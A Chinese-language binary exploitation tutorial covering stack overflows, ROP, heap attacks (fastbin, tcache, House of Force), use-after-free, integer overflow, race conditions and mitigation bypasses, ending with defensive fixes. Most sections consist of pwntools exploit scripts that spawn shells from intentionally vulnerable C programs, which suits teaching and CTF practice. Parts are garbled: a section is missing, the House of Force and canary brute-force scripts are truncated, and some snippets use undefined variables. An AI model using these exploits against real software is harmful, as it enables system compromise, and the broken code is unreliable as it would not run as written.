## 一、栈溢出原理与利用

### 1.1 栈溢出基础原理

栈溢出是最经典也是最常见的二进制漏洞。当函数向栈上的局部变量（缓冲区）写入数据时，如果没有正确检查数据长度，写入的数据可能超过缓冲区的边界，覆盖相邻的栈数据，包括保存的EBP、返回地址等。

** vulnerable C代码示例：**

```c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];          // 64字节栈缓冲区
    strcpy(buffer, input);    // 危险：不检查输入长度
    printf("Input: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc > 1) {
        vulnerable_function(argv[1]);
    }
    return 0;
}
```

**编译（关闭保护）：**

```bash
gcc -m32 -fno-stack-protector -no-pie -z execstack -o vuln vuln.c
# -fno-stack-protector: 关闭Canary
# -no-pie: 关闭PIE
# -z execstack: 栈可执行
```

**栈布局与溢出过程：**

```
溢出前（正常状态）：
高地址
+------------------+
|   函数参数 input  |
+------------------+
|   返回地址 0x...  |  ← 需要覆盖的目标
+------------------+
|   保存的EBP      |
+------------------+
|   buffer[56-63]   |
|   buffer[48-55]   |
|   buffer[40-47]   |
|   buffer[32-39]   |
|   buffer[24-31]   |  ← 输入从这开始
|   buffer[16-23]   |
|   buffer[8-15]    |
|   buffer[0-7]     |
+------------------+
低地址

溢出后（输入超过64字节）：
+------------------+
|   函数参数 input  |
+------------------+
|   0xDEADBEEF     |  ← 被覆盖的返回地址
+------------------+
|   AAAA (覆盖EBP)  |
+------------------+
|   BBBBBBBB        |
|   BBBBBBBB        |
|   BBBBBBBB        |  ← 填充数据
|   BBBBBBBB        |
|   BBBBBBBB        |
|   BBBBBBBB        |
|   BBBBBBBB        |
|   BBBBBBBB        |
+------------------+
```

**确定偏移量：**

使用pwntools的cyclic模式确定返回地址的确切偏移：

```python
from pwn import *

# 生成pattern
pattern = cyclic(200)
p = process('./vuln')
p.sendline(pattern)
p.wait()

# 查看崩溃时EIP的值
core = p.corefile
eip_value = core.ecx  # 或通过gdb查看崩溃时EIP
offset = cyclic_find(eip_value)
print(f"返回地址偏移: {offset}")
```

### 1.2 ret2text

ret2text（Return-to-text）是最简单的栈溢出利用方式：将返回地址覆盖为代码段中已有的函数或代码片段地址。

**适用条件：**
- 已知目标函数地址（非PIE或PIE地址已泄露）
- 目标函数在代码段中存在

**示例场景：**

```c
// 程序中存在后门函数
void backdoor() {
    system("/bin/sh");
}

void vulnerable(char *input) {
    char buf[64];
    strcpy(buf, input);
}
```

**利用脚本：**

```python
from pwn import *

context.arch = 'i386'
context.log_level = 'debug'

# 加载ELF文件获取地址
elf = ELF('./vuln')
backdoor_addr = elf.symbols['backdoor']
print(f"backdoor地址: {hex(backdoor_addr)}")

# 构造payload
# offset = 76 (64字节buffer + 8字节EBP + 4字节对齐)
offset = 76
payload = b'A' * offset
payload += p32(backdoor_addr)    # 覆盖返回地址为backdoor

p = process('./vuln')
p.sendline(payload)
p.interactive()
```

### 1.3 ret2shellcode

ret2shellcode将shellcode写入栈上缓冲区，然后覆盖返回地址为缓冲区地址，执行shellcode。

**适用条件：**
- 栈可执行（NX/DEP关闭，`-z execstack`）
- 知道缓冲区在栈上的地址

**shellcode编写：**

```python
from pwn import *

context.arch = 'i386'

# 方法1：使用pwntools内置shellcode
shellcode = asm(shellcraft.sh())

# 方法2：手动编写execve("/bin/sh", NULL, NULL) shellcode
# EAX = 0xb (execve系统调用号)
# EBX = "/bin/sh"地址
# ECX = 0 (argv=NULL)
# EDX = 0 (envp=NULL)
shellcode_manual = asm("""
    xor eax, eax
    push eax
    push 0x68732f2f   ; "//sh"
    push 0x6e69622f   ; "/bin"
    mov ebx, esp      ; EBX = "/bin//sh"
    xor ecx, ecx
    xor edx, edx
    mov al, 0xb       ; syscall 11 = execve
    int 0x80
""")

print(f"Shellcode长度: {len(shellcode_manual)}字节")
```

**利用脚本：**

```python
from pwn import *

context.arch = 'i386'
context.log_level = 'debug'

# 生成shellcode
shellcode = asm(shellcraft.sh())

# 假设已知buffer地址（通过打印其地址泄露）
# 程序中有: printf("buffer at %p\n", buffer);
buffer_addr = 0xffffcf90  # 需要通过信息泄露获取

offset = 76
payload = shellcode
payload += b'A' * (offset - len(shellcode))
payload += p32(buffer_addr)  # 返回到buffer地址执行shellcode

p = process('./vuln')
p.sendline(payload)
p.interactive()
```

### 1.4 ret2libc

ret2libc通过返回到libc中的函数（如system）来实现利用，绕过NX/DEP保护。

**适用条件：**
- 知道libc基址（ASLR关闭或地址已泄露）
- 能构造system函数需要的参数

**基本思路：**

```
覆盖栈布局：
[填充数据] | [system地址] | [system返回地址] | [system参数("/bin/sh"地址)]
```

**利用脚本：**

```python
from pwn import *

context.arch = 'i386'
context.log_level = 'debug'

# 假设已知libc地址
# 方法1: 通过puts泄露got表中的libc函数地址
# 方法2: ASLR关闭时直接使用固定地址

elf = ELF('./vuln')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

# 步骤1: 泄露libc地址
p = process('./vuln')

# 利用puts泄露GOT表中puts的地址
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']

offset = 76
# 第一次溢出：调用puts(puts@GOT) -> 返回main -> 再次溢出
payload1 = b'A' * offset
payload1 += p32(puts_plt)       # 调用puts
payload1 += p32(main_addr)      # puts返回后跳回main
payload1 += p32(puts_got)       # puts的参数：puts@GOT地址

p.sendline(payload1)

# 接收泄露的puts地址
p.recvuntil(b'Input: ')
leaked = p.recvline()
puts_addr = u32(leaked[:4])
print(f"泄露的puts地址: {hex(puts_addr)}")

# 步骤2: 计算libc基址
libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
print(f"libc基址: {hex(libc_base)}")
print(f"system地址: {hex(system_addr)}")
print(f"/bin/sh地址: {hex(binsh_addr)}")

# 步骤3: 第二次溢出，调用system("/bin/sh")
payload2 = b'A' * offset
payload2 += p32(system_addr)
payload2 += p32(0xdeadbeef)     # system的返回地址（不需要）
payload2 += p32(binsh_addr)     # system的参数

p.sendline(payload2)
p.interactive()
```

### 1.5 ROP链构造

ROP（Return-Oriented Programming）通过拼接多个以`ret`结尾的代码片段（gadget）来构造完整的攻击逻辑，绕过DEP/NX保护。

**ROP基本原理：**

```
栈布局：
[填充数据] | [gadget1_addr] | [gadget2_addr] | [gadget3_addr] | ...

执行流程：
1. ret -> 跳到gadget1执行
2. gadget1以ret结尾 -> 跳到gadget2执行
3. gadget2以ret结尾 -> 跳到gadget3执行
...
```

**x86 32位ROP示例：**

```python
from pwn import *

context.arch = 'i386'

# 查找gadget
# 常用gadget:
# pop eax; ret      -> 设置eax
# pop ebx; ret      -> 设置ebx
# pop ecx; ret      -> 设置ecx
# pop edx; ret      -> 设置edx
# int 0x80; ret     -> 系统调用

# 使用ROPgadget查找
# $ ROPgadget --binary vuln | grep "pop eax"
# $ ROPgadget --binary vuln | grep "int 0x80"

# 构造execve("/bin/sh", NULL, NULL)的ROP链
# EAX = 0xb (execve)
# EBX = "/bin/sh"地址
# ECX = 0
# EDX = 0

# 假设获取到的gadget地址
pop_eax_ret = 0x080a8af6    # pop eax; ret
pop_ebx_ecx_edx_ret = 0x0806ecb0  # pop ebx; pop ecx; pop edx; ret
int_0x80 = 0x0804a3f0       # int 0x80; ret
binsh_addr = 0x080ba0a0      # "/bin/sh"字符串地址

offset = 76
rop_chain = b''

# 设置 EBX="/bin/sh", ECX=0, EDX=0
rop_chain += p32(pop_ebx_ecx_edx_ret)
rop_chain += p32(binsh_addr)    # EBX
rop_chain += p32(0)              # ECX
rop_chain += p32(0)              # EDX

# 设置 EAX=0xb (execve)
rop_chain += p32(pop_eax_ret)
rop_chain += p32(0xb)            # EAX

# 触发系统调用
rop_chain += p32(int_0x80)

payload = b'A' * offset + rop_chain

p = process('./vuln')
p.sendline(payload)
p.interactive()
```

**x64 64位ROP示例：**

```python
from pwn import *

context.arch = 'amd64'

# x64系统调用号: execve = 59 (0x3b)
# 参数: RDI="/bin/sh", RSI=0, RDX=0
# 系统调用: syscall

# 常用x64 gadget:
# pop rdi; ret
# pop rsi; ret
# pop rdx; ret
# pop rax; ret
# syscall; ret

# 或更简单地使用libc中的system函数
# 需要泄露libc地址

# 使用one_gadget查找libc中的one-gadget RCE
# $ one_gadget /lib/x86_64-linux-gnu/libc.so.6
# 输出示例:
# 0x45226 execve("/bin/sh", ...)
# 0x4527a execve("/bin/sh", ...)
# 约束条件: [rsp+0x40] == NULL

# one_gadget利用
libc_base = 0x7ffff7a0d000  # 泄露得到
one_gadget_addr = libc_base + 0x45226

offset = 88  # x64下偏移不同
payload = b'A' * offset + p64(one_gadget_addr)

p = process('./vuln64')
p.sendline(payload)
p.interactive()
```

**使用pwntools的ROP模块：**

```python
from pwn import *

context.arch = 'i386'
elf = ELF('./vuln')

rop = ROP(elf)

# 自动查找gadget并构造调用
rop.system(0x804a0a0)  # 调用system("/bin/sh")

# 生成ROP链
rop_chain = rop.chain()
print(f"ROP链: {rop_chain.hex()}")

payload = b'A' * 76 + rop_chain
```

## 二、堆溢出与堆利用

### 2.1 ptmalloc内存管理基础

glibc的ptmalloc是Linux系统最常用的堆内存管理器，理解其内部结构是堆利用的基础。

**malloc_chunk结构：**

```c
struct malloc_chunk {
    INTERNAL_SIZE_T      mchunk_prev_size;  // 前一个chunk的大小（仅当前一个chunk空闲时有效）
    INTERNAL_SIZE_T      mchunk_size;       // 当前chunk的大小（含头部），低3位为标志位
    struct malloc_chunk* fd;                // 前向指针（仅空闲chunk有效）
    struct malloc_chunk* bk;                // 后向指针（仅空闲chunk有效）
    struct malloc_chunk* fd_nextsize;       // large bin专用
    struct malloc_chunk* bk_nextsize;       // large bin专用
};
```

**size字段标志位：**

| 位 | 名称 | 说明 |
|----|------|------|
| 0 | PREV_INUSE | 前一个chunk是否在使用中 |
| 1 | IS_MMAPPED | 是否通过mmap分配 |
| 2 | NON_MAIN_ARENA | 是否属于非主线程的arena |

**Bins分类：**

| Bin类型 | 大小范围 | 数据结构 | 特点 |
|---------|---------|---------|------|
| Fastbin | 16-128字节(32位)/32-176字节(64位) | 单链表(fd) | LIFO，不合并相邻chunk |
| Small bin | < 1024字节(512大小) | 双链表 | FIFO |
| Large bin | >= 1024字节 | 双链表+size链 | 按大小范围组织 |
| Unsorted bin | 任意大小 | 双链表 | 释放的chunk先放入此处 |
| tcache | 最多1040字节 | 单链表(fd) | 线程本地，优先分配 |

**堆内存布局示例：**

```
低地址                                     高地址
+----------+----------+----------+---------+--------+
| chunk A  | chunk B  | chunk C  | top     | unused |
| (in use) | (freed)  | (in use) | chunk   | space  |
+----------+----------+----------+---------+--------+
            ↑
           fd指向下一个空闲chunk
```

### 2.2 fastbin attack

fastbin attack利用fastbin链表的fd指针进行攻击。

**原理：**

当释放的chunk大小在fastbin范围内时，该chunk被插入fastbin单链表。如果通过堆溢出覆盖fastbin中chunk的fd指针，可以使其指向任意地址，后续malloc将返回该地址。

**漏洞代码：**

```c
#include <stdlib.h>
#include <string.h>

int main() {
    void *a, *b, *c;
    
    a = malloc(0x28);   // fastbin范围
    b = malloc(0x28);
    c = malloc(0x28);
    
    free(a);
    free(b);
    free(a);           // double free! a在fastbin中出现两次
    
    // fastbin: a -> b -> a -> b -> ...
    
    void *d = malloc(0x28);  // 返回a
    void *e = malloc(0x28);  // 返回b
    void *f = malloc(0x28);  // 返回a（但a就是d，我们已控制其内容）
    
    // 通过d控制a的fd指针
    // 设置fd为target地址
    memcpy(d, &target_addr, 8);
    
    void *g = malloc(0x28);  // 返回a（第二次）
    void *h = malloc(0x28);  // 返回target地址！任意地址写
    
    return 0;
}
```

**利用脚本：**

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

p = process('./heap_vuln')

def malloc(size, data):
    p.sendlineafter(b'choice:', b'1')
    p.sendlineafter(b'size:', str(size).encode())
    p.sendlineafter(b'data:', data)

def free(idx):
    p.sendlineafter(b'choice:', b'2')
    p.sendlineafter(b'idx:', str(idx).encode())

# 分配3个fastbin大小的chunk
malloc(0x28, b'AAAA')   # chunk0
malloc(0x28, b'BBBB')   # chunk1
malloc(0x28, b'CCCC')   # chunk2

# Double Free
free(0)    # fastbin: 0
free(1)    # fastbin: 1 -> 0
free(0)    # fastbin: 0 -> 1 -> 0 -> 1 -> ...

# 目标地址（需要伪造chunk的size字段）
target_addr = 0x602080  # GOT表附近

# 分配并写入target_addr作为fd
malloc(0x28, p64(target_addr))  # 返回chunk0，写入fd=target_addr
# fastbin: 1 -> 0 -> target_addr -> ...

malloc(0x28, b'DDDD')   # 返回chunk1
malloc(0x28, b'EEEE')   # 返回chunk0
malloc(0x28, b'FFFF')   # 返回target_addr！获得任意地址写

p.interactive()
```

### 2.3 unsorted bin attack

unsorted bin attack通过篡改unsorted bin的bk指针，实现任意地址写入一个固定值（unsorted_bin地址）。

**原理：**

当从unsorted bin中取出一个chunk时，会执行：

```c
// 简化的unsorted bin取出代码
victim = unsorted_chunks->bk;
// 从链表中移除
bck = victim->bk;
unsorted_chunks->bk = bck;
bck->fd = unsorted_chunks;  // 向bck->fd写入unsorted_bin地址
```

如果控制了victim->bk，则可以向`(victim->bk + 0x10)`地址写入一个libc地址。

**利用条件：**
- 能控制unsorted bin中chunk的bk指针
- 知道一个可写的目标地址

**利用场景：**
- 覆写global_max_fast变量，使更大的chunk走fastbin路径
- 覆写_IO_list_all指针，为FSOP攻击做准备

```python
from pwn import *

context.arch = 'amd64'

p = process('./heap_vuln')

def malloc(size):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'size:', str(size).encode())
    return p.recvline()

def free(idx):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'idx:', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendlineafter(b'data:', data)

# 分配不在fastbin范围的chunk
malloc(0x90)   # chunk0 (unsorted bin范围)
malloc(0x20)   # chunk1 (防止与top chunk合并)

free(0)         # chunk0进入unsorted bin

# 通过编辑功能覆盖chunk0的bk指针
target_addr = 0x602060  # global_max_fast地址
edit(0, p64(0) + p64(target_addr))  # 覆盖fd和bk

# 再次分配触发unsorted bin取出
# bck->fd = unsorted_chunks_addr
# 即 *(target_addr + 0x10) = unsorted_bin_addr
malloc(0x90)

# 现在 global_max_fast 被写入了一个很大的值
# 后续释放更大范围的chunk也会进入fastbin
```

### 2.4 tcache攻击

tcache（Thread Local Caching）是glibc 2.26引入的线程级堆缓存机制，大幅提高了分配速度但也带来了新的攻击面。

**tcache结构：**

```c
#define TCACHE_MAX_BINS     64
#define TCACHE_FILL_COUNT    7

typedef struct tcache_entry {
    struct tcache_entry *next;   // 单链表
    struct tcache_perthread_struct *key;  // 防double-free检查
} tcache_entry;

typedef struct tcache_perthread_struct {
    uint16_t counts[TCACHE_MAX_BINS];     // 每个bin的chunk计数
    tcache_entry *entries[TCACHE_MAX_BINS]; // 每个bin的链表头
} tcache_perthread_struct;
```

**tcache poisoning攻击：**

与fastbin attack类似，但tcache没有size检查（glibc 2.26-2.29），更容易利用。

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

p = process('./heap_tcache')

def malloc(size, data=b'A'):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'size:', str(size).encode())
    p.sendlineafter(b'data:', data)

def free(idx):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'idx:', str(idx).encode())

def show(idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'idx:', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'>', b'4')
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendlineafter(b'data:', data)

# 分配chunk
malloc(0x60, b'AAAA')   # idx0
malloc(0x60, b'BBBB')   # idx1
malloc(0x60, b'CCCC')   # idx2

# 释放后进入tcache
free(2)
free(1)
```

### 2.5 House of系列技术

House of系列是高级堆利用技术的集合，每种技术针对不同的场景。

| 技术 | 原理 | 适用版本 | 核心思路 |
|------|------|---------|---------|
| House of Spirit | 伪造chunk并释放 | 多版本 | 在目标地址伪造合法chunk，释放后再次分配 |
| House of Force | 利用top chunk | <2.29 | 覆盖top chunk大小为-1，任意地址分配 |
| House of Lore | 利用smallbin | <2.29 | 篡改smallbin的bk指针 |
| House of Einherjar | 利用prev_size合并 | <2.29 | 伪造prev_size触发chunk合并 |
| House of Orange | 无free利用 | <2.29 | 利用top chunk扩展失败触发unsorted bin |
| House of Storm | unsorted+largebin | <2.29 | 结合unsorted bin和largebin攻击 |

**House of Force示例：**

```c
// 漏洞代码
char *ptr = malloc(8);
ptr[0] = ...; // 堆溢出可以覆盖top chunk的size

// 将top chunk的size覆盖为0xFFFFFFFFFFFFFFFF (-1)
// 之后malloc(任意大小)将扩展top chunk
// 如果malloc(目标地址 - top_chunk地址 - 头部大小)
// 返回的chunk地址就在目标地址处
```

```python
from pwn import *

context.arch = 'amd64'

p = process('./house_of_force')

def malloc(size, data=b'A'):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'size:', str(size).encode())
    p.sendlineafter(b'data:', data)

def malloc_at(addr):
    """计算需要malloc的大小使返回地址为addr"""
    # top_chunk_addr + 8 + size == addr
    # size = addr - top_chunk_addr - 8

# 假设已知top chunk地址和目标地址
top_chunk_addr = 0x603010
target_addr = 0x602060  # GOT表

evil_size &= 0xFFFFFFFFFFFFFFFF  # 无符号

# 下一次分配返回target_addr
```

| %p | 输出指针（栈上数据） | 信息泄露 |
| %x | 输出十六进制 | 信息泄露 |

## 四、UAF漏洞利用

Use-After-Free（UAF）漏洞发生在释放后的内存被再次使用时。

**漏洞代码：**

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    void (*print)(char *);
    char *name;
} Object;

void print_name(char *name) {
    printf("Name: %s\n", name);
}

void print_shell(char *name) {
    system("/bin/sh");
}

Object *create_object(char *name) {
    Object *obj = malloc(sizeof(Object));
    obj->print = print_name;
    obj->name = name;
    return obj;
}

int main() {
    Object *obj = create_object("hello");
    
    free(obj);             // 释放对象
    // obj成为悬挂指针
    
    // 分配相同大小的数据，可能复用obj的内存
    char *input = malloc(sizeof(Object));
    // 用户可以控制input的内容
    memcpy(input, user_input, sizeof(Object));
    
    // 通过悬挂指针调用函数
    obj->print(obj->name);  // UAF! 函数指针被覆盖
    // 如果用户将print覆盖为system，name覆盖为"/bin/sh"
    // 就相当于 system("/bin/sh")
    
    return 0;
}
```

**利用思路：**

```python
from pwn import *

context.arch = 'amd64'

p = process('./uaf_vuln')

# 泄露的地址
system_addr = 0x4005b0
binsh_addr = 0x4009c0

# 对象大小 = 8(函数指针) + 8(name指针) = 16
# 分配相同大小的chunk

p.sendlineafter(b'>', b'1')  # 创建对象
p.sendlineafter(b'>', b'2')  # 释放对象

# 分配相同大小的chunk，填充函数指针和name
payload = p64(system_addr) + p64(binsh_addr)
p.sendlineafter(b'>', b'3')  # 分配新数据
p.sendlineafter(b'data:', payload)

# 通过悬挂指针调用
p.sendlineafter(b'>', b'4')  # 调用obj->print(obj->name)
# 实际调用: system("/bin/sh")

p.interactive()
```

**C++虚函数表UAF：**

```cpp
class Base {
public:
    virtual void show() { printf("Base\n"); }
};

class Derived : public Base {
public:
    void show() override { printf("Derived\n"); }
};

// 利用：释放对象后用可控数据填充
// 将虚表指针覆盖为伪造的虚函数表
```

## 五、整数溢出

整数溢出是由于算术运算结果超出整数类型的表示范围而导致的意外行为。

**常见整数溢出类型：**

| 类型 | 说明 | 示例 |
|------|------|------|
| 有符号溢出 | 运算结果超出有符号数范围 | INT_MAX + 1 = INT_MIN |
| 无符号回绕 | 运算结果回绕 | 0 - 1 = 0xFFFFFFFF |
| 截断 | 大类型赋值给小类型 | 0x10000存入uint16_t = 0 |
| 符号扩展 | 有符号数扩展为更大的有符号数 | -1 (0xFF) -> 0xFFFFFFFF |

**漏洞示例1：长度检查绕过**

```c
void copy_data(char *src, int len) {
    char buf[256];
    if (len <= 256) {         // 检查长度
        memcpy(buf, src, len); // 如果len为负数，memcpy会转为大无符号数
    }
}

// 攻击者传入 len = -1
// len <= 256 为真（有符号比较）
// memcpy(buf, src, (size_t)-1) = memcpy(buf, src, 0xFFFFFFFF)
// 导致大量数据拷贝 -> 栈溢出
```

**漏洞示例2：分配大小溢出**

```c
char *alloc_buffer(int count, int elem_size) {
    int total = count * elem_size;  // 可能整数溢出
    char *buf = malloc(total);
    return buf;
}

// 攻击者传入 count=0x10000, elem_size=0x10000
// total = 0x10000 * 0x10000 = 0x100000000 -> 截断为0
// malloc(0) 分配小块内存
// 后续拷贝大量数据 -> 堆溢出
```

**漏洞示例3：符号扩展**

```c
int get_chunk_size(char *input) {
    short len = atoi(input);  // short: -32768 to 32767
    if (len > 0) {
        return len;           // 返回int，正数
    }
    return 0;
}

// 攻击者传入 "65535"
// atoi返回65535，但存入short变为-1
// -1不大于0，返回0
// 但某些路径中len被当作unsigned使用...
```

## 六、竞争条件漏洞

竞争条件（Race Condition）漏洞发生在多个线程/进程并发访问共享资源时，由于操作顺序不可预测导致安全问题。

**TOCTOU（Time-of-Check-Time-of-Use）示例：**

```c
void access_check(char *filename) {
    if (access(filename, R_OK) == 0) {  // 检查权限
        // 攻击者在此处进行符号链接替换
        // filename -> /etc/shadow
        FILE *f = fopen(filename, "r");  // 使用
        char buf[1024];
        fgets(buf, sizeof(buf), f);
        printf("%s", buf);
    }
}
```

**利用思路：**
1. 创建合法文件`/tmp/safe_file`
2. 启动`access_check("/tmp/safe_file")`
3. 在`access()`和`fopen()`之间，将`/tmp/safe_file`替换为指向`/etc/shadow`的符号链接
4. `fopen()`打开的是`/etc/shadow`

**多线程竞争条件示例：**

```c
int balance = 1000;

void transfer(int amount) {
    // 非原子操作
    int temp = balance;
    // 线程切换可能在此处发生
    temp = temp - amount;
    // 另一个线程可能已经修改了balance
    balance = temp;
}

// 线程1: transfer(500) -> temp=1000-500=500 -> balance=500
// 线程2: transfer(500) -> temp=1000-500=500 -> balance=500 (本应=0)
```

**Double-Fetch竞争条件（内核）：**

```c
// 内核中的double fetch漏洞
// 用户态指针被内核读取两次
copy_from_user(&size, user_ptr, sizeof(size));  // 第一次读取
if (size < MAX_SIZE) {
    // 攻击者在此处修改用户空间数据
    copy_from_user(&data, user_ptr, sizeof(data));  // 第二次读取，size已变大
    // 可能导致内核溢出
}
```

### 7.1 ASLR绕过

ASLR通过随机化地址布局增加利用难度。绕过ASLR的核心思路是信息泄露。

**绕过方法：**

1. **格式化字符串泄露**：通过`%p`泄露栈上的libc地址
2. **内存读取漏洞**：利用越界读取泄露地址
3. **爆破**：32位系统ASLR熵有限，可爆破（但成功率低）
4. **fork子进程**：fork子进程继承父进程地址空间
5. **部分覆盖**：只覆盖地址的低字节（12位不随机化）
6. **文件描述符泄露**：通过proc文件系统泄露

**信息泄露利用：**

```python
from pwn import *

context.arch = 'amd64'

p = process('./vuln')

# 方法1: 通过puts泄露GOT表

rop = ROP(elf)
```

### 7.2 ROP绕过DEP

DEP（Data Execution Prevention）阻止在数据段执行代码。ROP通过复用代码段中已有的指令片段绕过DEP。

**完整ROP利用流程：**

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process('./vuln')

# 步骤1: 泄露libc地址
# 使用pop rdi; ret gadget
pop_rdi = 0x400c83  # ROPgadget查找得到
ret = 0x400c84      # 用于栈对齐

# 构造: puts(puts@GOT) -> main
payload1 = b'A' * 72
payload1 += p64(pop_rdi)          # pop rdi; ret
payload1 += p64(elf.got['puts'])  # rdi = puts@GOT
payload1 += p64(elf.plt['puts'])  # call puts
payload1 += p64(elf.symbols['main'])  # 返回main

p.sendline(payload1)

# 接收泄露
p.recvline()  # 消耗多余行
leaked = p.recvline()
puts_addr = u64(leaked[:6].ljust(8, b'\x00'))
libc_base = puts_addr - libc.symbols['puts']
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

log.info(f"libc基址: {hex(libc_base)}")
log.info(f"system: {hex(system)}")
log.info(f"/bin/sh: {hex(binsh)}")

# 步骤2: 调用system("/bin/sh")
# 需要栈对齐: x64要求调用前rsp%16==0
# 如果不对齐，加一个ret
payload2 = b'A' * 72
payload2 += p64(ret)              # 栈对齐
payload2 += p64(pop_rdi)          # pop rdi; ret
payload2 += p64(binsh)            # rdi = "/bin/sh"
payload2 += p64(system)           # call system

p.sendline(payload2)
p.interactive()
```

### 7.3 Bypass Canary

```python
# 在fork的子进程中，Canary与父进程相同

from pwn import *

                    break

canary = brute_canary()
```

### 7.4 SROP

SROP（Sigreturn-Oriented Programming）利用`sigreturn`系统调用伪造信号帧，一次性设置所有寄存器。

**原理：**

1. 触发`sigreturn`系统调用（通过伪造信号处理返回）
2. 内核从栈上读取`sigcontext`结构，恢复所有寄存器
3. 攻击者构造伪造的`sigcontext`，控制所有寄存器

**sigcontext结构（x64）：**

```c
struct sigcontext {
    __u64 r8;
    __u64 r9;
    __u64 r10;
    __u64 r11;
    __u64 r12;
    __u64 r13;
    __u64 r14;
    __u64 r15;
    __u64 rdi;
    __u64 rsi;
    __u64 rbp;
    __u64 rbx;
    __u64 rdx;
    __u64 rax;
    __u64 rcx;
    __u64 rsp;
    __u64 rip;
    __u64 eflags;
    // ... 其他字段
};
```

**SROP利用：**

```python
from pwn import *

context.arch = 'amd64'

elf = ELF('./srop_vuln')

# 需要找到:
# 1. 一个syscall gadget
# 2. 能设置rax=15 (sigreturn系统调用号)
# 或者程序中有触发sigreturn的路径

# 假设已知
syscall_addr = 0x400500
mov_rax_15_ret = 0x400600  # 设置rax=15然后ret到syscall

# 使用pwntools构造SigreturnFrame
frame = SigreturnFrame()
frame.rax = 59              # execve系统调用号
frame.rdi = binsh_addr      # "/bin/sh"地址
frame.rsi = 0               # argv=NULL
frame.rdx = 0               # envp=NULL
frame.rip = syscall_addr    # 执行syscall
frame.rsp = new_stack_addr  # 新的栈指针

payload = b'A' * offset
payload += p64(mov_rax_15_ret)  # 设置rax=15
payload += p64(syscall_addr)     # 执行sigreturn
payload += bytes(frame)          # 伪造的信号帧

p = process('./srop_vuln')
p.sendline(payload)
p.interactive()
```

### 8.6 安全修复建议

```c
// 修复后的安全代码
void safe_function() {
    char buf[64];
    printf("Input: ");
    // 修复1: 限制读取长度
    ssize_t n = read(0, buf, sizeof(buf) - 1);
    if (n <= 0) return;
    buf[n] = '\0';
    
    // 修复2: 使用格式化字符串常量
    printf("Your input: %s\n", buf);
    
    // 或者使用puts
    // fputs("Your input: ", stdout);
    // fwrite(buf, 1, n, stdout);
    // putchar('\n');
}
```

**防御建议汇总：**

| 漏洞类型 | 防御措施 | 编译选项 |
|---------|---------|---------|
| 栈溢出 | 使用安全函数，边界检查 | -fstack-protector-strong |
| 格式化字符串 | 使用printf("%s", input) | -Wformat -Werror=format-security |
| 堆溢出 | 安全释放，使用智能指针 | -D_FORTIFY_SOURCE=2 |
| UAF | 释放后置空指针，使用智能指针 | -fsanitize=address (调试) |
| 整数溢出 | 使用安全整数库 | -ftrapv |
| 竞争条件 | 使用锁，原子操作 | - |
| 通用防护 | 全部开启 | -fPIE -pie -Wl,-z,relro,-z,now |
